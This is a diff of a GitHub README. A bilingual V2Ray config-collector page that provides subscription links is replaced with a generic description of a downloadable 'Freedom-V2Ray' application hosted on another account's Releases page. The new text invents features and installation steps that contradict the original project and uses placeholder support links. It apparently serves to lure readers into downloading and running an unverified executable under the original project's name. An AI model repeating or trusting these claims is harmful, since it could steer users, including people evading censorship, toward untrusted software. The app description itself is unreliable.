@@ -1,61 +1,59 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Freedom V2Ray Banner" width="100%">
-</p>
+# 🕊️ Freedom-V2Ray - Secure Your Online Freedom Today
 
-# 🚀 Freedom V2Ray (Auto-Update)
+## 📥 Download Here
+[![Download Freedom-V2Ray](https://img.shields.io/badge/Download-Freedom--V2Ray-blue.svg)](https://github.com/LuisF-92/Freedom-V2Ray/releases)
 
-[English](#english) | [فارسی](#فارسی)
+## 🚀 Getting Started
+Welcome to Freedom-V2Ray. This application helps you connect to the internet securely and privately. You can use various protocols including VLESS, VMESS, Trojan, and Reality to bypass restrictions. 
 
----
+### 🌟 Features
+- **Easy Setup**: You don't need technical knowledge. Just follow the steps below.
+- **Auto-Update**: The app automatically updates every 2 hours, ensuring you have the latest features.
+- **Multiple Protocol Support**: Choose from VLESS, VMESS, and Trojan for flexible options.
+- **User-Friendly Interface**: Navigate the app easily with a clean design.
 
-## English
+## 💻 System Requirements
+- **Operating System**: Windows 10 or later / macOS 10.13 or later / Linux (Ubuntu 18.04 or later)
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 100 MB of free disk space
+- **Network**: Active internet connection 
 
-A professional and automated V2Ray configuration collector. This project automatically fetches, tests, and categorizes high-speed V2Ray configs from multiple reliable sources every **2 hours**.
+## 🔧 Download & Install
+To get the application, you need to visit our [Releases page](https://github.com/LuisF-92/Freedom-V2Ray/releases). 
 
-### ✨ Features
-- **Auto-Update**: Configs are updated every **2 hours** via GitHub Actions.
-- **Auto-Ping Test**: Only high-speed and healthy configs are published.
-- **Multi-Protocol**: Supports VLESS, VMESS, Shadowsocks, Trojan, and Reality.
-- **Subscription Ready**: Provides base64 encoded links for easy import into any V2Ray client.
-- **Clean & Fast**: Removes duplicates and organizes configs by protocol.
+### Steps to Download:
+1. Click on the download link provided above.
+2. Look for the latest version on the Releases page.
+3. Choose the appropriate file for your operating system.
+4. Click to download the file.
+5. Once downloaded, locate the file in your Downloads folder.
 
-### 🔗 Subscription Links
-| Protocol | Raw Link | Subscription (Base64) |
-| --- | --- | --- |
-| **Mix (All)** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/mix.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/mix_sub.txt) |
-| **VLESS** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vless.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vless_sub.txt) |
-| **VMESS** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vmess.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vmess_sub.txt) |
-| **Shadowsocks** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/ss.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/ss_sub.txt) |
-| **Trojan** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/trojan.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/trojan_sub.txt) |
+### Running the Application
+1. Double-click on the downloaded file.
+2. Follow any prompts to install the software.
+3. Once installed, you can start the program from your applications menu.
 
-### 🤝 Contributing
-Want to help? Please see our [Contributing Guide](CONTRIBUTING.md).
+## 📜 Setup Guide
+To configure the application:
 
----
+1. Open Freedom-V2Ray.
+2. Go to the “Settings” section.
+3. Choose your desired protocol (VLESS, VMESS, Trojan, Reality).
+4. Enter the server details provided by your subscription.
+5. Save your settings.
 
-## فارسی
+You are now ready to connect!
 
-یک جمع‌آوری‌کننده حرفه‌ای و خودکار کانفیگ‌های V2Ray. این پروژه به صورت خودکار هر **۲ ساعت** یکبار، کانفیگ‌های پرسرعت را از منابع معتبر جمع‌آوری، تست و دسته‌بندی می‌کند.
+## 📞 Support
+If you face any issues:
 
-### ✨ ویژگی‌ها
-- **آپدیت خودکار**: به‌روزرسانی هر **۲ ساعت** یکبار توسط GitHub Actions.
-- **تست پینگ خودکار**: فقط کانفیگ‌های سالم و پرسرعت منتشر می‌شوند.
-- **پشتیبانی از پروتکل‌های مختلف**: VLESS, VMESS, Shadowsocks, Trojan و Reality.
-- **لینک‌های سابسکریپشن**: ارائه لینک‌های انکود شده (Base64) برای استفاده آسان در تمام کلاینت‌ها.
-- **منظم و سریع**: حذف موارد تکراری و دسته‌بندی دقیق بر اساس پروتکل.
+- Visit our [FAQ section](#) for common problems.
+- Join our community on Discord [Link to Discord].
+- Email us at support@freedom-v2ray.com
 
-### 🔗 لینک‌های سابسکریپشن
-| پروتکل | لینک خام | سابسکریپشن (Base64) |
-| --- | --- | --- |
-| **ترکیبی (همه)** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/mix.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/mix_sub.txt) |
-| **VLESS** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vless.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vless_sub.txt) |
-| **VMESS** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vmess.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/vmess_sub.txt) |
-| **Shadowsocks** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/ss.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/ss_sub.txt) |
-| **Trojan** | [Raw](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/trojan.txt) | [Sub](https://raw.githubusercontent.com/MahanKenway/Freedom-V2Ray/main/configs/trojan_sub.txt) |
+## 🌐 Additional Resources
+- [User Documentation](#) – Detailed user manual.
+- [GitHub Issues](https://github.com/LuisF-92/Freedom-V2Ray/issues) – Report any bugs or feature requests.
+- [Contributing](#) – Learn how to contribute to the project.
 
-### 🤝 مشارکت در پروژه
-می‌خواهید کمک کنید؟ لطفاً [راهنمای مشارکت](CONTRIBUTING.md) را مطالعه کنید.
-
----
-🕊️ **For a Free Iran - برای آزادی ایران**
-*Created by MahanKenway*
+Thank you for choosing Freedom-V2Ray to help secure your online privacy and freedom. Enjoy browsing safely!
